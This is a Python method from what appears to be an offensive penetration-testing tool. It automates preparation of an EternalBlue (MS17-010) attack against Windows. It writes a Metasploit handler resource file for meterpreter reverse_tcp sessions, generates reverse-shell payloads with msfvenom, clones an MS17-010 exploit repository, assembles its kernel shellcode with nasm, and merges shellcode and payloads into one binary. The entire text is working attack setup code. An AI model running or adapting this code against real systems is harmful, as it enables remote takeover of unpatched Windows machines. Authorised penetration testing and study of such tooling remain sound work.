def setup(self):
        """
            This function will call msfvenom, nasm and git via subprocess to setup all the things.
            Returns True if everything went well, otherwise returns False.
        """
        lport64 = self.port64
        lport32 = self.port32
        print_notification("Using ip: {}".format(self.ip))

        print_notification("Generating metasploit resource file")
        resource = """use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST {ip}
set LPORT {port64}
set ExitOnSession false
run -j
set payload windows/meterpreter/reverse_tcp
set LHOST {ip}
set LPORT {port32}
set ExitOnSession false
run -j
""".format(ip=self.ip, port64=lport64, port32=lport32)
        self.resource_file = os.path.join(self.datadir, 'ms17_resource.rc')
        with open(self.resource_file, 'w') as f:
            f.write(resource)
        print_success("Resource file created, run the following command in msfconsole:")
        print_success("resource {}".format(self.resource_file))

        command_64 = "msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f raw -o {datadir}/payload32.bin".format(ip=self.ip, port=lport32, datadir=self.datadir)
        command_32 = "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f raw -o {datadir}/payload64.bin".format(ip=self.ip, port=lport64, datadir=self.datadir)
        print_notification("Generating payloads")

        process = subprocess.run(command_32.split(' '), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if process.returncode != 0:
            print_error("Problem with generating payload:")
            print_error(process.stderr)
            return False

        process = subprocess.run(command_64.split(' '), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if process.returncode != 0:
            print_error("Problem with generating payload:")
            print_error(process.stderr)
            return False

        if not os.path.exists(os.path.join(self.datadir, 'MS17-010')):
            print_notification("Git repo was not found, cloning")
            process = subprocess.run("git clone https://github.com/mwgielen/MS17-010 {dir}".format(dir=os.path.join(self.datadir, 'MS17-010')).split(' '))
            if process.returncode != 0:
                print_error("Problems with cloning git")
                return False

        process = subprocess.run("nasm {datadir}/MS17-010/shellcode/eternalblue_kshellcode_x64.asm -o {datadir}/kshell64.bin".format(datadir=self.datadir).split(' '))
        if process.returncode != 0:
            print_error("Problems with NASM")
            return False
        process = subprocess.run("nasm {datadir}/MS17-010/shellcode/eternalblue_kshellcode_x86.asm -o {datadir}/kshell86.bin".format(datadir=self.datadir).split(' '))
        if process.returncode != 0:
            print_error("Problems with NASM")
            return False

        self.combine_files('kshell64.bin', 'payload64.bin', 'final_met_64.bin')
        self.combine_files('kshell86.bin', 'payload32.bin', 'final_met_32.bin')
        self.create_payload('final_met_32.bin', 'final_met_64.bin', 'final_combined.bin')
        print_notification("Combining payloads done")
        print_success("Setup Done")
        return True